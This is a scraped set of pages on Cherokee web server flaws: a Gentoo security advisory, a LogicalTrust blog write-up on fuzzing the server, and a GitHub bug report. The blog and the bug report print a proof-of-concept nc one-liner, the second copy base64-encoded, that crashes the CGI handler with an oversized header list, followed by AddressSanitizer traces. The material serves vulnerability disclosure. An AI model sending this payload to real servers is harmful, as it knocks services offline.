=== Content from security.gentoo.org_7e73bbda_20250121_001753.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Cherokee: Multiple vulnerabilities — GLSA **202012-09**

Multiple vulnerabilities have been found in Cherokee, the worst of
which could result in a Denial of Service condition.

### Affected packages

| Package | **www-servers/cherokee** on all architectures |
| --- | --- |
| Affected versions | <= **1.2.104-r2** |
| Unaffected versions |  |

### Background

Cherokee is an extra-light web server.

### Description

Multiple vulnerabilities have been discovered in Cherokee. Please review
the CVE identifiers referenced below for details.

### Impact

Please review the referenced CVE identifiers for details.

### Workaround

There is no known workaround at this time.

### Resolution

Gentoo has discontinued support for Cherokee. We recommend that users
unmerge package:

```
 # emerge --unmerge "www-servers/cherokee"

```
### References

* [CVE-2006-1681](https://nvd.nist.gov/vuln/detail/CVE-2006-1681)
* [CVE-2019-20798](https://nvd.nist.gov/vuln/detail/CVE-2019-20798)
* [CVE-2019-20799](https://nvd.nist.gov/vuln/detail/CVE-2019-20799)
* [CVE-2019-20800](https://nvd.nist.gov/vuln/detail/CVE-2019-20800)
* [CVE-2020-12845](https://nvd.nist.gov/vuln/detail/CVE-2020-12845)

**Release date**

December 23, 2020

**Latest revision**

December 23, 2020: 1

**Severity**

low

**Exploitable**

remote

**Bugzilla entries**

* [715204](https://bugs.gentoo.org/show_bug.cgi?id=715204)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from logicaltrust.net_8b271f1f_20250121_001753.html ===

Menu

[![](/images/logo.svg)](/en/)

* [Home](/en/)
* [Services](/en/#services)
* [Blog](/blog.html)
* [About us](/about.html)
* [Contact](#contact)

* [**EN**](/en/)
* [PL](/)

# [EN] A-Z: Cherokee

For the letter *c* we chose [Cherokee project](http://cherokee-project.com/). It is a web server written mainly in C language. What’s interesting, this server may be met on IoT devices including GoPro cameras.

![logo](/images/cherokee-logo.png)

Our approach to find bugs was quite similar to the previous ones, but we decided to extend it in some ways.

## Preparing

We started with preparing the environment for fuzzing.

```
$ git clone https://github.com/cherokee/webserver.git
```

During building we encountered a problem:

```
undefined reference to `rpl_malloc`
```

which was solved by setting `ac_cv_func_realloc_0_nonnull=yes ac_cv_func_malloc_0_nonnull=yes`.
So finally, we were able to build with:

```
$ ac_cv_func_realloc_0_nonnull=yes ac_cv_func_malloc_0_nonnull=yes LDFLAGS="-lasan" LDADD="-lasan" CFLAGS="-fsanitize=address -ggdb -O0 -fprofile-arcs -ftest-coverage" ./configure --prefix=`pwd`/bin --enable-trace --enable-static-module=all --enable-static --enable-shared=no
make
```

After building:
Run the main server

```
$ cherokee
```

and administration panel (with an option to listen on all network interfaces)

```
$ cherokee-admin -l 0.0.0.0
```
## Fuzzing

Our idea was to test [all handlers](https://cherokee-project.com/doc/modules_handlers.html) offered by the server. We enabled and made them available under paths `/test1`, `/test2`, …, `/test19`. Backed up configuration file is also available [here](https://raw.githubusercontent.com/LogicalTrust/materials/master/az/c/cherokee.txt).

Radamsa was run from a custom script. A few HTTP requests were taken as an input and after modification were sent to all handlers.

## Additional tools

To improve result analysis we set up two additional tools. The first one - *gcov*, was already configured during the building (with compiler flags `-fprofile-arcs -ftest-coverage`). This tool helps in measuring code coverage. After some time of fuzzing it was beneficial to verify through how many code paths we went through.

While the application was running, special files `*.gcda` were created. They can be converted to HTML files with ease to read statistics.

```
$ lcov --capture --directory . --output-file coverage.info
$ genhtml coverage.info --output-directory out
```

As the result, coverage report in form of HTML document will appear in `out` directory.

The second tool - OpenGrok, was set up to help reading the code. It’s a source code browser, supporting cross-reference navigation and search options in a browser. Its installation and configuration process is well documented on the [project’s page](https://github.com/oracle/opengrok).

## Results

By fuzzing we discovered several crashes in various handlers. All were reported on the Cherokee’s GitHub.

* <https://github.com/cherokee/webserver/issues/1226>
* <https://github.com/cherokee/webserver/issues/1225>
* <https://github.com/cherokee/webserver/issues/1224>
* <https://github.com/cherokee/webserver/issues/1222>
* <https://github.com/cherokee/webserver/issues/1221>

One of the interesting findings was in code responsible for handling headers before passing them to the CGI.

```
typedef struct {
        cherokee_handler_cgi_base_t base;

        int               post_data_sent;    /* amount POSTed to the CGI */
        int               pipeInput;         /* read from the CGI */
        int               pipeOutput;        /* write to the CGI */
        char             *envp[ENV_VAR_NUM]; /* Environ variables for execve() */
        int               envp_last;
        pid_t             pid;               /* CGI pid */
} cherokee_handler_cgi_t;
```

Structure `cherokee_handler_cgi_t` has fixed size array for environmental variables including request headers. When the handler processes a request it adds entries without checking whether boundary value was reached.

```
310     cgi->envp[cgi->envp_last] = entry;
311     cgi->envp_last++;
```

So, sending a request with enough headers causes writing outside the array.

```
echo -e 'GET /test10/test.html HTTP/1.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.170141183460469231731687303715884105727\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 4294967295.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nHost: 127.0.0.1\nUser-Agent: python\n\n' | nc 127.0.0.1 80
```

```
=================================================================
==10864==ERROR: AddressSanitizer: SEGV on unknown address 0x6180001cb3c0 (pc 0x55c74bfd2f94 bp 0x7f6bac2e6220 sp 0x7f6bac2e61f0 T7)
==10864==The signal is caused by a WRITE memory access.
    #0 0x55c74bfd2f93 in cherokee_handler_cgi_add_env_pair /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:310
    #1 0x55c74c02d6e4 in foreach_header_add_unknown_variable /home/mmm/fuzz/webserver/cherokee/handler_cgi_base.c:664
    #2 0x55c74c09fe32 in cherokee_header_foreach_unknown /home/mmm/fuzz/webserver/cherokee/header.c:1220
    #3 0x55c74c02db36 in cherokee_handler_cgi_base_build_envp /home/mmm/fuzz/webserver/cherokee/handler_cgi_base.c:696
    #4 0x55c74bfd30f3 in add_environment /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:328
    #5 0x55c74bfd6912 in fork_and_execute_cgi_via_spawner /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:787
    #6 0x55c74bfd35a8 in cherokee_handler_cgi_init /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:382
    #7 0x55c74c04b44c in cherokee_handler_init /home/mmm/fuzz/webserver/cherokee/handler.c:93
    #8 0x55c74c048233 in cherokee_connection_open_request /home/mmm/fuzz/webserver/cherokee/connection.c:2678
    #9 0x55c74bf84889 in process_active_connections /home/mmm/fuzz/webserver/cherokee/thread.c:1165
    #10 0x55c74bf8a549 in cherokee_thread_step_MULTI_THREAD /home/mmm/fuzz/webserver/cherokee/thread.c:2086
    #11 0x55c74bf7e300 in thread_routine /home/mmm/fuzz/webserver/cherokee/thread.c:99
    #12 0x7f6bb2b166da in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76da)
    #13 0x7f6bb263b88e in __clone (/lib/x86_64-linux-gnu/libc.so.6+0x12188e)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:310 in cherokee_handler_cgi_add_env_pair
Thread T7 created by T0 here:
    #0 0x7f6bb2f9dd2f in __interceptor_pthread_create (/usr/lib/x86_64-linux-gnu/libasan.so.4+0x37d2f)
    #1 0x55c74bf7f219 in cherokee_thread_new /home/mmm/fuzz/webserver/cherokee/thread.c:247
    #2 0x55c74bf6773f in initialize_server_threads /home/mmm/fuzz/webserver/cherokee/server.c:671
    #3 0x55c74bf69a05 in cherokee_server_initialize /home/mmm/fuzz/webserver/cherokee/server.c:1053
    #4 0x55c74bf0d76f in common_server_initialization /home/mmm/fuzz/webserver/cherokee/main_worker.c:255
    #5 0x55c74bf0e1f7 in main /home/mmm/fuzz/webserver/cherokee/main_worker.c:393
    #6 0x7f6bb253bb96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)

==10864==ABORTING
```
### XSS

Despite the bugs discovered by fuzzing, two reflected XSS vulnerabilities were found manually:

* <https://github.com/cherokee/webserver/issues/1223>
* <https://github.com/cherokee/webserver/issues/1227>

The first one affects only `400 Bad Request` responses, thus it seems hard to be used against the user. The second one was found in the administration handler. This handler is used by default in the administration panel but also can be set up as a handler in the main server. The problem lies in copying the invoked URL to a response. The URL is not encoded before put in HTML, CSS and JavaScript code, so special characters can be placed by an attacker.

As an authenticated administrator has access to powerful options in the panel, we created a Proof of Concept exploit to show how this vulnerability can be used to achieve Remote Code Execution.

After opening the URL all actions are executed by the exploit, no further user interaction was required. For easier development this exploit simulates filling proper inputs in the panel which is quite slow, thus some parts of the video are sped up.

## Summary

Utilizing fuzzing adjusted to the project’s features and additionally extending our approach with manual testing, several crashes and XSS vulnerabilities were found. One of them directly lead to RCE.

All reported bugs have been fixed.

Written on November 15, 2019 by
Mateusz Kocielski, Michał Dardas

## We invite you to contact us

through the following form:

**I agree to the processing of my personal data and sending the offer.**
Rules for the processing of personal data.

send

LogicalTrust sp. z o.o.
sp. k.

Stanisławowska 47
54-611 Wrocław, Poland, EU

NIP: 8952177980
KRS: 0000713515

**T.: +48 797 772 743**

**office@logicaltrust.net**
Key:   [PGP/GPG](/logicaltrust.gpg)

![LogicalTrust](/images/logo.svg)

copyright © 2007 - 2024 LogicalTrust

We support:
![las na zawsze - logo](/images/foundationlogo-lasnazawsze_a.png)
![unicef - logo](/images/foundationlogo-unicef_a.png)

×
## Rules for the processing of personal data.

According to art. 13 of the General Regulation on the Protection of Personal Data of 27 April 2016 (Official Journal EU L 119 of 04.05.2016) I inform that:

* **Data Administrator:** The administrator of your personal data is Logicaltrust sp. z o.o. sp. k., with its registered office at ul. Stanisławowska 47, 54-611 Wrocław, Tax Identification Number (NIP): 8952177980, National Business Registry Number (REGON): 369271084, National Court Register Number (KRS): 0000713515.
* **Contact with the Data Administrator:** You can contact the data administrator via email at: ado@logicaltrust.net or by traditional mail by sending a letter to the administrator's registered office address.
* **Purpose and Legal Basis for Processing Personal Data:** Your personal data will be processed by the data administrator for the purpose of responding to your inquiries, executing requested contact, taking actions prior to entering into a contract, performing the contract, establishing business relationships, presenting offers upon potential client's request (based on Art. 6(1)(a), (b), and (f) of the General Data Protection Regulation).
* **Data Processing Period:** Your personal data will be processed for the time necessary to clarify your matter and provide a comprehensive response. They will also be processed for the duration of cooperation and the contract (in this case, the data is processed as client data). In the event of non-cooperation, the data will be promptly deleted unless there is a need for further retention for the purpose of defense and protection against claims. In cases where the processing of personal data is based on voluntarily given consent according to Art. 6(1)(a) of the General Data Protection Regulation, you have the right to withdraw your consent at any time. The withdrawal of consent does not affect the lawfulness of processing based on consent before its withdrawal, in accordance with the applicable law.
* **Scope of Processed Data:** The scope of processed data includes: first name, last name, email, and phone number.
* **Recipients of Personal Data:** In specific situations, your personal data may be disclosed, for example, to fulfill a legal obligation or to exercise legally justified interests pursued by the data administrator or by a third party. The categories of recipients to whom the data administrator may disclose your personal data are entities or authorities authorized by law and service providers processing personal data on behalf of the data administrator based on data processing agreements (e.g., hosting company).
* **Data Transfers:** Your personal data will not be transferred outside the European Economic Area.
* **Rights and Entitlements:** You have the right to request access to your personal data, their correction, deletion, or processing limitations, as well as the right to object to data processing. You also have the right to file a complaint with the President of the Personal Data Protection Office (ul. Stawki 2, 00-193 Warsaw) if you believe that the processing of personal data violates data protection regulations.
* **Additional Information:** Providing data is voluntary, but failure to provide data necessary for correspondence may hinder the execution and maintenance of contact.

×
## Cookie policy

* 1. **About cookies** - Cookies are small data files, especially text files, which are stored by a server on your computer. With these files, your device will be recognized and, in consequence, the way a given website is presented will be adjusted to your personal preferences. Cookies usually contain the name of the website from which they originate, information on how long they have been stored on the device and a unique number.
* 2. **Which type of cookies do we use** - Session cookies – temporary files which are stored on your device until you log out from a given website or close the Internet browser. Persistent cookies – permanent files that remain on your device for a fixed period (specified in the parameters of the file) or until they are deleted manually. Third-party cookies – files that adjust the way a given website is presented to your personal preferences.
* 3. **Why do we use cookies?** - Cookies are used for the purpose of statistics, marketing and in order to adjust the contents of websites to the user's personal preferences. Cookies store information about geolocation, the visitor's language and random data about session identifiers. With the collected data, we are able to understand how exactly the visitor uses websites and, consequently, to improve their structure and content. The information received helps us to prepare statistics related to the number of new and regular users as well as enables us to analyze which pages are visited.
* 4. **How to use and how to disable cookies** - You can change the settings of your Internet browser at any time, so that it would block cookies or inform you when they are being sent. However, please note that if you do not accept the cookie policy, you may encounter some problems while using the website. The software used for searching websites accepts the cookies by default. The settings of an Internet browser can be changed, so that it would block cookies or inform the user each time when cookies are being sent onto his/her device. For more information on how to disable automatic saving of cookies, please check the settings of your Internet browser (the software used for searching Internet websites).

This page uses cookies. Click here to learn more. Accept Reject



=== Content from github.com_b6c2a51d_20250121_001753.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcherokee%2Fwebserver%2Fissues%2F1224)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcherokee%2Fwebserver%2Fissues%2F1224)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=cherokee%2Fwebserver)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cherokee](/cherokee)
/
**[webserver](/cherokee/webserver)**
Public

* [Notifications](/login?return_to=%2Fcherokee%2Fwebserver) You must be signed in to change notification settings
* [Fork
  104](/login?return_to=%2Fcherokee%2Fwebserver)
* [Star
   567](/login?return_to=%2Fcherokee%2Fwebserver)

* [Code](/cherokee/webserver)
* [Issues
  423](/cherokee/webserver/issues)
* [Pull requests
  11](/cherokee/webserver/pulls)
* [Actions](/cherokee/webserver/actions)
* [Projects
  0](/cherokee/webserver/projects)
* [Wiki](/cherokee/webserver/wiki)
* [Security](/cherokee/webserver/security)
* [Insights](/cherokee/webserver/pulse)

Additional navigation options

* [Code](/cherokee/webserver)
* [Issues](/cherokee/webserver/issues)
* [Pull requests](/cherokee/webserver/pulls)
* [Actions](/cherokee/webserver/actions)
* [Projects](/cherokee/webserver/projects)
* [Wiki](/cherokee/webserver/wiki)
* [Security](/cherokee/webserver/security)
* [Insights](/cherokee/webserver/pulse)

# CGI Handler too many headers #1224

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[CGI Handler too many headers](#top)#1224Copy linkAssignees [![skinkie](https://avatars.githubusercontent.com/u/502394?s=64&u=f7e7f76f74720518c262536906c9c51e45c3fd6e&v=4)](/skinkie)Labels[has-patch](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22has-patch%22)[t:bug](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22t%3Abug%22)![@mmmds](https://avatars.githubusercontent.com/u/4034742?v=4&size=80)
## Description

![@mmmds](https://avatars.githubusercontent.com/u/4034742?v=4&size=48)[mmmds](https://github.com/mmmds)opened [on Jul 25, 2019](https://github.com/cherokee/webserver/issues/1224#issue-472903806)

struct cherokee\_handler\_cgi\_t (handler\_cgi.h) consist of a fixed sized array (char \*envp[ENV\_VAR\_NUM]) for environ variables. Sending a request with a lot of headers, causes to

increment int envp\_last to a value greater than ENV\_VAR\_NUM resulting in reading outside the array.

handler\_cgi.c:

```
310     cgi->envp[cgi->envp_last] = entry;
311     cgi->envp_last++;

```
### PoC

```
echo -n 'R0VUIC90ZXN0MTAvdGVzdC5odG1sIEhUVFAvMS4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMTcwMTQxMTgzNDYwNDY5MjMxNzMxNjg3MzAzNzE1ODg0MTA1NzI3Ckhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDQyOTQ5NjcyOTUuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpIb3N0OiAxMjcuMC4wLjEKSG9zdDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpVc2VyLUFnZW50OiBweXRob24KCgo=' | base64 -d | nc 127.0.0.1 80

```
### ASAN

```
=================================================================
==10864==ERROR: AddressSanitizer: SEGV on unknown address 0x6180001cb3c0 (pc 0x55c74bfd2f94 bp 0x7f6bac2e6220 sp 0x7f6bac2e61f0 T7)
==10864==The signal is caused by a WRITE memory access.
    #0 0x55c74bfd2f93 in cherokee_handler_cgi_add_env_pair /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:310
    #1 0x55c74c02d6e4 in foreach_header_add_unknown_variable /home/mmm/fuzz/webserver/cherokee/handler_cgi_base.c:664
    #2 0x55c74c09fe32 in cherokee_header_foreach_unknown /home/mmm/fuzz/webserver/cherokee/header.c:1220
    #3 0x55c74c02db36 in cherokee_handler_cgi_base_build_envp /home/mmm/fuzz/webserver/cherokee/handler_cgi_base.c:696
    #4 0x55c74bfd30f3 in add_environment /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:328
